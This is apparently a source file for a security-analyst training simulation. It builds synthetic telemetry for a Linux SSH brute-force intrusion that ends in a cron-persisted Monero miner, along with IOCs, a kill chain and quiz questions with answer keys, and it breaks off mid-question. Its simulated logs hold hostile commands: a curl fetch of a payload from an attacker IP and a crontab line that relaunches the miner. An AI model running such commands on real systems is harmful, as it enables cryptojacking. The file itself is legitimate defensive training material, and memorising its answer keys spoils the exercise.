import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

/**
 * Exposed SSH → Cron Persistence → Cryptominer (INTERMEDIATE)
 *
 * A pure-Linux intrusion. Deliberately contains NO Windows concepts:
 * no integrity levels, no DLLs, no Authenticode. Privilege is expressed the way
 * Linux expresses it — uid / gid / euid / egid / auid — and the persistence the
 * attacker installs is bounded by exactly those numbers.
 *
 * PRIVILEGE CHAIN (SPEC rule 1):
 *   The attacker lands as svc-backup (uid 1004, gid 1004). Event lsc_06 is an
 *   auditd USER_CMD record showing `sudo -l` returning res=failed — svc-backup is
 *   NOT in sudoers. The attacker therefore never has root, and every later action
 *   stays inside what uid 1004 already owns:
 *     - writes under /home/svc-backup/ (owned by uid 1004)
 *     - installs a USER crontab via /usr/bin/crontab, which is setgid crontab(102);
 *       the auditd SYSCALL shows egid=102 while uid/euid stay 1004, which is the
 *       exact mechanism that lets an unprivileged user create
 *       /var/spool/cron/crontabs/svc-backup (ouid=1004 ogid=102 mode=0600).
 *     - the miner runs as uid 1004, capped by that account's limits.
 *   Nothing is written to /etc/cron.d, /etc/systemd/system, or any root-owned path.
 */
export function buildLinuxSshCryptominerScenario(
  scenarioId = "linux-ssh-cryptominer-2026",
): ScenarioBundle {
  const B = new Date("2026-04-14T21:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  /** auditd stamps are epoch seconds; keep them in lockstep with T(). */
  const EPOCH = 1_776_202_800;
  const A = (min: number) => (EPOCH + min * 60).toString();

  const host = {
    name: "nix-bkp-01",
    fqdn: "nix-bkp-01.northwind-logistics.io",
    publicIp: "84.200.17.42",
    privateIp: "10.40.2.15",
    sshPort: 2202,
    os: "Ubuntu 22.04.4 LTS",
    vcpu: 8,
  };

  const attacker = {
    spray1: "45.148.10.87",
    spray2: "89.248.165.32",
    spray3: "194.26.229.11",
    // The IP that actually logs in. It appears in NONE of the failure records.
    success: "193.32.162.140",
    payloadHost: "45.61.136.14",
  };

  const pool = { domain: "pool.supportxmr.com", ip: "51.222.12.201", port: 3333 };
  const wallet =
    "48Bkq7sMQrN3vTgHy2WdcPfXe9RuJ5a6ZnLbCmK4tiyE1DwGoApSxV7hFqjUr2NkeM9zTbYcQ5vRdgHnW3sJPuA6XLfkM8e";
  const minerHash = makeSha256("xmrig_6_21_3_linux_static_kworker");
  const minerDir = "/home/svc-backup/.cache/.fontconfig";
  const minerPath = `${minerDir}/kworker`;

  const events: TelemetryEvent[] = [
    // ── 1. BENIGN DISCRIMINATOR ────────────────────────────────────────────────
    {
      id: "lsc_01_admin_ssh",
      ts: T(0),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      user_email: "d.okonkwo@northwind-logistics.io",
      user_title: "Linux Systems Administrator",
      src_ip: "82.166.44.9",
      dst_ip: host.publicIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "informational",
      expected_verdict: "fp",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "Administrator d.okonkwo authenticated to nix-bkp-01 on tcp/2202 with an ED25519 public key from the corporate VPN egress 82.166.44.9. No failed attempts precede it.",
      fp_explanation:
        "This is a legitimate admin session and the control group for the whole scenario. Three things separate it from the compromise at 22:38: the method is publickey (not password, so it cannot be brute-forced), the source is the known corporate VPN egress rather than a hosting-provider IP, and there is not a single Failed password line from 82.166.44.9 beforehand. Students who alert on 'SSH login to an internet-exposed host' alone will flag this and be wrong.",
      authentication: { method: "publickey", result: "success" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": "82.166.44.9",
        "data.srcport": "58114",
        "data.dstport": "2202",
        "data.srcuser": "d.okonkwo",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "d.okonkwo",
        "data.audit.uid": "0",
        "data.audit.auid": "1002",
        "data.audit.ses": "39",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "pam_unix",
        "data.audit.res": "success",
        "agent.name": host.name,
        "agent.ip": host.privateIp,
        location: "/var/log/auth.log",
        full_log:
          "Apr 14 21:40:00 nix-bkp-01 sshd[1712]: Accepted publickey for d.okonkwo from 82.166.44.9 port 58114 ssh2: ED25519 SHA256:9pQr2Kk4mZ7nWc1TbUeAx3sVdHyLg0Ff6JqRoNiPtEw",
      },
    },

    // ── 2. Brute force — invalid usernames ────────────────────────────────────
    {
      id: "lsc_02_invalid_user",
      ts: T(31 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.spray2,
      dst_ip: host.publicIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "sshd on nix-bkp-01 logged an 'Invalid user' failure for jenkins from 89.248.165.32 on tcp/2202 — one representative record from a repeating pattern of generic usernames.",
      authentication: { method: "password", result: "failure" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.spray2,
        "data.srcport": "44118",
        "data.dstport": "2202",
        "data.srcuser": "jenkins",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "jenkins",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
        "agent.name": host.name,
        location: "/var/log/auth.log",
        full_log:
          "Apr 14 22:11:07 nix-bkp-01 sshd[1803]: Invalid user jenkins from 89.248.165.32 port 44118\nApr 14 22:11:07 nix-bkp-01 sshd[1803]: Failed password for invalid user jenkins from 89.248.165.32 port 44118 ssh2",
      },
    },

    // ── 3. Brute force — valid username, wrong password ───────────────────────
    {
      id: "lsc_03_failed_svcbackup",
      ts: T(52 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.spray1,
      dst_ip: host.publicIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "sshd failures on nix-bkp-01 switched from 'Invalid user' to 'Failed password for svc-backup', arriving from 45.148.10.87 on tcp/2202.",
      authentication: { method: "password", result: "failure" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.spray1,
        "data.srcport": "39562",
        "data.dstport": "2202",
        "data.srcuser": "svc-backup",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
        "agent.name": host.name,
        location: "/var/log/auth.log",
        full_log:
          "Apr 14 22:32:44 nix-bkp-01 sshd[1841]: Failed password for svc-backup from 45.148.10.87 port 39562 ssh2\nApr 14 22:32:44 nix-bkp-01 sshd[1841]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=45.148.10.87  user=svc-backup",
      },
    },

    // ── 4. The compromise moment ──────────────────────────────────────────────
    {
      id: "lsc_04_accepted_password",
      ts: T(58 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      src_ip: attacker.success,
      dst_ip: host.publicIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "'Accepted password for svc-backup' from 193.32.162.140 on tcp/2202 — session 41, auid 1004, the only successful password authentication on this host today.",
      authentication: { method: "password", result: "success" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.success,
        "data.srcport": "41772",
        "data.dstport": "2202",
        "data.srcuser": "svc-backup",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.addr": attacker.success,
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "pam_unix",
        "data.audit.res": "success",
        "agent.name": host.name,
        location: "/var/log/auth.log",
        full_log:
          "Apr 14 22:38:11 nix-bkp-01 sshd[1876]: Accepted password for svc-backup from 193.32.162.140 port 41772 ssh2\nApr 14 22:38:11 nix-bkp-01 sshd[1876]: pam_unix(sshd:session): session opened for user svc-backup(uid=1004) by (uid=0)\ntype=CRED_ACQ msg=audit(" +
          A(58) +
          '.204:88190): pid=1876 uid=0 auid=1004 ses=41 msg=\'op=PAM:setcred grantors=pam_unix acct="svc-backup" exe="/usr/sbin/sshd" hostname=193.32.162.140 addr=193.32.162.140 terminal=ssh res=success\'',
      },
    },

    // ── 5. Host enumeration ───────────────────────────────────────────────────
    {
      id: "lsc_05_enumeration",
      ts: T(60 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_execve",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "Ninety seconds after the login, session 41 ran id, uname -a, cat /etc/os-release and crontab -l from /home/svc-backup. The SYSCALL record shown is the `id` execution.",
      process: {
        name: "id",
        pid: 1901,
        path: "/usr/bin/id",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "id",
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "59",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1901",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.suid": "1004",
        "data.audit.fsuid": "1004",
        "data.audit.tty": "pts0",
        "data.audit.ses": "41",
        "data.audit.comm": "id",
        "data.audit.exe": "/usr/bin/id",
        "data.audit.cwd": "/home/svc-backup",
        "data.audit.key": "exec-tracking",
        "data.audit.execve.a0": "id",
        "agent.name": host.name,
        location: "/var/log/audit/audit.log",
        full_log:
          "type=SYSCALL msg=audit(" +
          A(60) +
          '.417:88203): arch=c000003e syscall=59 success=yes exit=0 ppid=1877 pid=1901 auid=1004 uid=1004 gid=1004 euid=1004 suid=1004 fsuid=1004 egid=1004 sgid=1004 fsgid=1004 tty=pts0 ses=41 comm="id" exe="/usr/bin/id" key="exec-tracking"\ntype=EXECVE msg=audit(' +
          A(60) +
          ".417:88203): argc=1 a0=\"id\"",
      },
    },

    // ── 6. THE PRIVILEGE BOUNDARY ─────────────────────────────────────────────
    {
      id: "lsc_06_sudo_denied",
      ts: T(61 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "sudo_command",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "Session 41 ran `sudo -l` on nix-bkp-01. auditd recorded USER_CMD with res=failed, and sudo logged 'svc-backup : user NOT in sudoers' from terminal pts/0.",
      process: {
        name: "sudo",
        pid: 1908,
        path: "/usr/bin/sudo",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "sudo -l",
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "USER_CMD",
        "data.audit.pid": "1908",
        "data.audit.uid": "1004",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.cwd": "/home/svc-backup",
        "data.audit.cmd": "7375646F202D6C",
        "data.audit.terminal": "pts/0",
        "data.audit.exe": "/usr/bin/sudo",
        "data.audit.res": "failed",
        "agent.name": host.name,
        location: "/var/log/audit/audit.log",
        full_log:
          "type=USER_CMD msg=audit(" +
          A(61) +
          ".882:88207): pid=1908 uid=1004 auid=1004 ses=41 msg='cwd=\"/home/svc-backup\" cmd=7375646F202D6C terminal=pts/0 res=failed'\nApr 14 22:41:22 nix-bkp-01 sudo[1908]: svc-backup : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/svc-backup ; USER=root ; COMMAND=list",
      },
    },

    // ── 7. Payload download ───────────────────────────────────────────────────
    {
      id: "lsc_07_payload_download",
      ts: T(64 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      dst_ip: attacker.payloadHost,
      dst_port: 80,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      description:
        "curl fetched a 6.4 MB ELF binary over plain HTTP from 45.61.136.14 and wrote it to /home/svc-backup/.cache/.fontconfig/kworker as uid 1004.",
      process: {
        name: "curl",
        pid: 1934,
        path: "/usr/bin/curl",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
        user: "svc-backup",
        hash: { sha256: makeSha256("usr_bin_curl_ubuntu2204") },
      },
      file: {
        name: "kworker",
        path: minerPath,
        sha256: minerHash,
        size: 6_710_886,
      },
      network: {
        url: "http://45.61.136.14/updates/kworker",
        method: "GET",
        status: 200,
        bytes_in: 6_710_886,
        bytes_out: 214,
      },
      raw: {
        "cs.event.SimpleName": "ProcessRollup2",
        "cs.FileName": "curl",
        "cs.FilePath": "/usr/bin/",
        "cs.CommandLine": `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
        "cs.ParentBaseFileName": "bash",
        "cs.UserName": "svc-backup",
        "cs.UID": "1004",
        "cs.GID": "1004",
        "cs.SHA256HashData": makeSha256("usr_bin_curl_ubuntu2204"),
        "host.os.type": "linux",
        "host.os.name": "Ubuntu",
        "host.os.version": "22.04.4 LTS",
        "host.hostname": host.fqdn,
        "event.outcome": "success",
      },
    },

    // ── 8. Making it executable ───────────────────────────────────────────────
    {
      id: "lsc_08_chmod",
      ts: T(66 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "file_modify",
      hostname: host.name,
      severity: "medium",
      mitre_technique: "T1036.005",
      mitre_tactic: "Defense Evasion",
      description:
        "chmod 755 was applied to /home/svc-backup/.cache/.fontconfig/kworker. The PATH record shows the file at mode 0100755 with ouid 1004 and ogid 1004.",
      process: {
        name: "chmod",
        pid: 1941,
        path: "/usr/bin/chmod",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `chmod 755 ${minerPath}`,
        user: "svc-backup",
      },
      file: { name: "kworker", path: minerPath, sha256: minerHash },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "268",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1941",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.ses": "41",
        "data.audit.comm": "chmod",
        "data.audit.exe": "/usr/bin/chmod",
        "data.audit.key": "perm-mod",
        "data.audit.file.name": minerPath,
        "data.audit.file.mode": "0100755",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "1004",
        "data.audit.file.nametype": "NORMAL",
        "agent.name": host.name,
        location: "/var/log/audit/audit.log",
        full_log:
          "type=SYSCALL msg=audit(" +
          A(66) +
          '.331:88238): arch=c000003e syscall=268 success=yes exit=0 ppid=1877 pid=1941 auid=1004 uid=1004 gid=1004 euid=1004 suid=1004 fsuid=1004 egid=1004 sgid=1004 fsgid=1004 tty=pts0 ses=41 comm="chmod" exe="/usr/bin/chmod" key="perm-mod"\ntype=PATH msg=audit(' +
          A(66) +
          `.331:88238): item=0 name="${minerPath}" inode=1573429 dev=08:01 mode=0100755 ouid=1004 ogid=1004 rdev=00:00 nametype=NORMAL`,
      },
    },

    // ── 9. USER-LEVEL CRON PERSISTENCE ────────────────────────────────────────
    {
      id: "lsc_09_user_crontab",
      ts: T(68 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_cron",
      hostname: host.name,
      severity: "high",
      mitre_technique: "T1053.003",
      mitre_tactic: "Persistence",
      description:
        "A per-user crontab was installed for svc-backup in session 41: /usr/bin/crontab created /var/spool/cron/crontabs/svc-backup at mode 0600, ouid 1004, ogid 102.",
      process: {
        name: "crontab",
        pid: 1958,
        path: "/usr/bin/crontab",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "crontab -",
        user: "svc-backup",
      },
      file: {
        name: "svc-backup",
        path: "/var/spool/cron/crontabs/svc-backup",
        size: 178,
      },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "257",
        "data.audit.success": "yes",
        "data.audit.exit": "4",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1958",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "102",
        "data.audit.sgid": "102",
        "data.audit.fsgid": "102",
        "data.audit.ses": "41",
        "data.audit.comm": "crontab",
        "data.audit.exe": "/usr/bin/crontab",
        "data.audit.key": "cron-mod",
        "data.audit.file.name": "/var/spool/cron/crontabs/svc-backup",
        "data.audit.file.mode": "0100600",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "102",
        "data.audit.file.nametype": "CREATE",
        "agent.name": host.name,
        location: "/var/log/audit/audit.log",
        full_log:
          "type=SYSCALL msg=audit(" +
          A(68) +
          '.019:88251): arch=c000003e syscall=257 success=yes exit=4 ppid=1877 pid=1958 auid=1004 uid=1004 gid=1004 euid=1004 suid=1004 fsuid=1004 egid=102 sgid=102 fsgid=102 tty=pts0 ses=41 comm="crontab" exe="/usr/bin/crontab" key="cron-mod"\ntype=EXECVE msg=audit(' +
          A(68) +
          '.019:88251): argc=2 a0="crontab" a1="-"\ntype=PATH msg=audit(' +
          A(68) +
          '.019:88251): item=0 name="/var/spool/cron/crontabs/svc-backup" inode=1442817 dev=08:01 mode=0100600 ouid=1004 ogid=102 rdev=00:00 nametype=CREATE\nApr 14 22:48:01 nix-bkp-01 crontab[1958]: (svc-backup) REPLACE (svc-backup)',
        "cron.file": "/var/spool/cron/crontabs/svc-backup",
        "cron.content": `*/10 * * * * pgrep -u svc-backup -f kworker >/dev/null || ${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
      },
    },

    // ── 10. Miner execution ───────────────────────────────────────────────────
    {
      id: "lsc_10_miner_exec",
      ts: T(70 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      severity: "critical",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      description:
        "kworker launched from the hidden .fontconfig directory as uid 1004 with parent bash, carrying a Monero wallet, a pool address and --max-cpu-usage 90 on its command line.",
      process: {
        name: "kworker",
        pid: 1974,
        path: minerPath,
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
        user: "svc-backup",
        hash: { sha256: minerHash },
      },
      file: { name: "kworker", path: minerPath, sha256: minerHash, size: 6_710_886 },
      raw: {
        "cs.event.SimpleName": "ProcessRollup2",
        "cs.FileName": "kworker",
        "cs.FilePath": `${minerDir}/`,
        "cs.CommandLine": `${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
        "cs.ParentBaseFileName": "bash",
        "cs.ParentProcessId": "1877",
        "cs.UserName": "svc-backup",
        "cs.UID": "1004",
        "cs.GID": "1004",
        "cs.SHA256HashData": minerHash,
        "host.os.type": "linux",
        "host.os.name": "Ubuntu",
        "host.hostname": host.fqdn,
        "event.outcome": "success",
      },
    },

    // ── 11. Outbound pool traffic ─────────────────────────────────────────────
    {
      id: "lsc_11_pool_traffic",
      ts: T(72 * MIN),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      dst_ip: pool.ip,
      dst_port: pool.port,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      description:
        "Outbound TCP from nix-bkp-01 to 51.222.12.201:3333 (pool.supportxmr.com, Canada) accepted by egress policy 42 — 96,420 bytes sent, 1,842,360 received.",
      network: { domain: pool.domain, bytes_in: 1_842_360, bytes_out: 96_420 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.level": "notice",
        "data.action": "accept",
        "data.srcip": host.privateIp,
        "data.srcport": "48120",
        "data.srcintf": "port3",
        "data.dstip": pool.ip,
        "data.dstport": "3333",
        "data.dstintf": "wan1",
        "data.proto": "6",
        "data.policyid": "42",
        "data.service": "tcp/3333",
        "data.app": "unknown",
        "data.appcat": "unscanned",
        "data.srccountry": "Reserved",
        "data.dstcountry": "Canada",
        "data.sentbyte": 96_420,
        "data.rcvdbyte": 1_842_360,
        "data.duration": 2_405,
        "data.vd": "root",
        "data.logdesc": "Traffic Statistics",
        "data.msg": "connection accepted",
      },
    },

    // ── 12. BENIGN DISCRIMINATOR — legitimate high-CPU batch job ──────────────
    {
      id: "lsc_12_backup_job",
      ts: T(85 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      severity: "informational",
      expected_verdict: "fp",
      description:
        "The nightly restic deduplication job started on nix-bkp-01 and is consuming roughly one core. It is one of the two processes on the CPU alert at 23:15.",
      fp_explanation:
        "This is the intended workload of a backup server and it is not the cause of the alert. Every attribute is the opposite of the miner: it runs from /usr/bin (not a hidden dot-directory under a home), its parent is cron launching a ROOT-owned /etc/cron.d/northwind-backup entry, it runs as the dedicated backup account (uid 34), it is bounded at ~96% of one core, and its only network destination is the internal repository host 10.40.2.60. Students must compare the two processes rather than assume 'high CPU on a backup server at night' is always benign or always malicious.",
      process: {
        name: "restic",
        pid: 2103,
        path: "/usr/bin/restic",
        parent_name: "cron",
        parent_pid: 1102,
        cmdline: "/usr/bin/restic backup --repo sftp:repo@10.40.2.60:/srv/restic /srv/data --exclude-caches",
        user: "backup",
        hash: { sha256: makeSha256("restic_0_16_4_linux_amd64") },
      },
      raw: {
        "cs.event.SimpleName": "ProcessRollup2",
        "cs.FileName": "restic",
        "cs.FilePath": "/usr/bin/",
        "cs.CommandLine":
          "/usr/bin/restic backup --repo sftp:repo@10.40.2.60:/srv/restic /srv/data --exclude-caches",
        "cs.ParentBaseFileName": "cron",
        "cs.ParentProcessId": "1102",
        "cs.UserName": "backup",
        "cs.UID": "34",
        "cs.GID": "34",
        "cs.SHA256HashData": makeSha256("restic_0_16_4_linux_amd64"),
        "cron.source_file": "/etc/cron.d/northwind-backup",
        "cron.source_file_owner": "root",
        "host.os.type": "linux",
        "host.hostname": host.fqdn,
        "event.outcome": "success",
      },
    },

    // ── 13. Monitoring alert ──────────────────────────────────────────────────
    {
      id: "lsc_13_cpu_alert",
      ts: T(95 * MIN),
      source: "siem",
      vendor: "Wazuh",
      event_type: "edr_alert",
      hostname: host.name,
      severity: "high",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      description:
        "The sustained load-average rule fired on nix-bkp-01. The captured `top` output on this 8-vCPU host shows kworker at 690% CPU and restic at 96%.",
      rule: { id: "100742", name: "High sustained load average", category: "resource_anomaly" },
      raw: {
        "rule.id": "100742",
        "rule.level": "7",
        "rule.description": "High sustained load average",
        "rule.groups": ["ossec", "command_monitoring", "performance"],
        "decoder.name": "wazuh-command",
        "agent.name": host.name,
        "agent.ip": host.privateIp,
        location: "command_loadavg",
        full_log:
          "23:15:03 up 214 days,  4:11,  2 users,  load average: 15.94, 15.71, 14.88\n" +
          "  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n" +
          " 1974 svc-bac+  20   0 4682312 2.412g   3204 S 690.0  30.9  145:22.71 kworker\n" +
          " 2103 backup    20   0  892440 214332   8812 S  96.0   2.6    9:41.03 restic",
        "data.load_1m": "15.94",
        "data.load_5m": "15.71",
        "data.load_15m": "14.88",
        "data.cpu_count": "8",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "ip", value: attacker.spray1, first_seen: T(52 * MIN), reputation: "malicious", tags: ["ssh-auth-failure", "external", "hosting-provider"] },
    { type: "ip", value: attacker.spray2, first_seen: T(31 * MIN), reputation: "malicious", tags: ["ssh-auth-failure", "external", "hosting-provider"] },
    { type: "ip", value: attacker.spray3, first_seen: T(31 * MIN), reputation: "malicious", tags: ["ssh-auth-failure", "external"] },
    { type: "ip", value: attacker.success, first_seen: T(58 * MIN), reputation: "malicious", tags: ["ssh-auth-success", "external", "interactive-session"] },
    { type: "ip", value: attacker.payloadHost, first_seen: T(64 * MIN), reputation: "malicious", tags: ["payload-host", "http", "external"] },
    { type: "ip", value: pool.ip, first_seen: T(72 * MIN), reputation: "malicious", tags: ["outbound", "long-lived-session", "tcp-3333"] },
    { type: "domain", value: pool.domain, first_seen: T(72 * MIN), reputation: "malicious", tags: ["mining-pool", "external"] },
    { type: "url", value: "http://45.61.136.14/updates/kworker", first_seen: T(64 * MIN), reputation: "malicious", tags: ["payload-url", "cleartext-http"] },
    { type: "sha256", value: minerHash, first_seen: T(64 * MIN), reputation: "malicious", tags: ["elf", "dropped-file", "masqueraded-name"] },
    { type: "user", value: "svc-backup", first_seen: T(58 * MIN), reputation: "suspicious", tags: ["compromised-account", "uid-1004", "password-auth"] },
    { type: "host", value: host.fqdn, first_seen: T(31 * MIN), reputation: "suspicious", tags: ["internet-exposed-ssh", "tcp-2202"] },
  ];

  const killchain = [
    { ts: T(0), phase: "Baseline", action: "Legitimate admin publickey session from the corporate VPN egress — the control case for the auth log" },
    { ts: T(31 * MIN), phase: "Credential Access", action: "Distributed password guessing on tcp/2202 from three hosting-provider IPs, generic usernames (T1110.001)" },
    { ts: T(52 * MIN), phase: "Credential Access", action: "Guessing narrows to svc-backup — 'Invalid user' becomes 'Failed password for svc-backup' (T1110.001)" },
    { ts: T(58 * MIN), phase: "Initial Access", action: "Accepted password for svc-backup from 193.32.162.140 — an IP with no prior failures (T1078)" },
    { ts: T(60 * MIN), phase: "Discovery", action: "id, uname -a, /etc/os-release, crontab -l run in session 41 as uid 1004 (T1033)" },
    { ts: T(61 * MIN), phase: "Discovery", action: "sudo -l returns res=failed — svc-backup is not in sudoers, no root path available (T1033)" },
    { ts: T(64 * MIN), phase: "Command and Control", action: "curl pulls a 6.4 MB ELF over HTTP into a hidden dir inside the account's own home (T1105)" },
    { ts: T(66 * MIN), phase: "Defense Evasion", action: "chmod 755 on a file owned by uid 1004; named 'kworker' to imitate a kernel thread (T1036.005)" },
    { ts: T(68 * MIN), phase: "Persistence", action: "User crontab installed via setgid-crontab binary — /var/spool/cron/crontabs/svc-backup, mode 0600 (T1053.003)" },
    { ts: T(70 * MIN), phase: "Impact", action: "Miner launched as uid 1004 with Monero wallet and pool on the command line (T1496)" },
    { ts: T(72 * MIN), phase: "Impact", action: "Long-lived outbound session to pool.supportxmr.com:3333 permitted by catch-all egress policy 42 (T1496)" },
    { ts: T(85 * MIN), phase: "Baseline", action: "Nightly restic job starts from a root-owned /etc/cron.d entry as uid 34 — the benign CPU consumer" },
    { ts: T(95 * MIN), phase: "Detection", action: "Sustained load average alert on the 8-vCPU host; top shows kworker 690% alongside restic 96%" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "lsc_q1",
      xp: 50,
      kind: "single",
      prompt:
        "auth.log for 14 April contains two successful SSH sessions — d.okonkwo at 21:40 and svc-backup at 22:38. Which single field in these records separates the intrusion from the legitimate session?",
      hint: "Compare the authentication method recorded on each Accepted line, not the timestamps.",
      options: [
        { value: "method", label: "The authentication method — publickey for d.okonkwo, password for svc-backup, and only passwords can be guessed" },
        { value: "hour", label: "The hour of the session — 22:38 falls outside business hours while 21:40 is still inside the change window" },
        { value: "port", label: "The destination port — the admin reached tcp/22 while the attacker reached the exposed tcp/2202 listener" },
        { value: "shell", label: "The login shell recorded by PAM — the attacker was given /bin/bash while the admin received /bin/sh" },
      ],
      answer: "method",
      explanation:
        "Both Accepted lines look identical at a glance, but d.okonkwo's says 'Accepted publickey' and svc-backup's says 'Accepted password'. A public key cannot be brute-forced, which is why no Failed password lines precede the admin session while 21 minutes of them precede the other. Note also what the Accepted line does NOT match: 193.32.162.140 appears in no failure record at all, so do not expect the winning address to be the one you were counting failures from — in a distributed campaign the guessing nodes and the hands-on node are different machines. Hour is not evidence — 21:40 is also outside business hours, so it separates nothing. Port is wrong: both sessions arrive on tcp/2202, the host's only listener. The shell is identical for both and is not recorded on the Accepted line at all.",
    },
    {
      id: "lsc_q2",
      xp: 75,
      kind: "single",
      prompt:
        "Event lsc_06 is an auditd USER_CMD record for `sudo -l` with res=failed. What does this record let you conclude about the rest of the incident?",
      hint: "auditd records identity as numbers. Read uid, euid and auid across every later event.",
      options: [
        { value: "no_root", label: "The attacker never obtained root, so the blast radius is bounded to files and jobs owned by uid 1004" },
        { value: "escalated", label: "The attacker escalated moments later, because a failed sudo attempt normally precedes a working kernel exploit" },
        { value: "wrong_pw", label: "The attacker mistyped the password for svc-backup, so the sudo rule itself may still be usable later" },
        { value: "no_shell", label: "The attacker had no interactive terminal, because auditd cannot record USER_CMD without a controlling tty" },
      ],
      answer: "no_root",
      explanation:
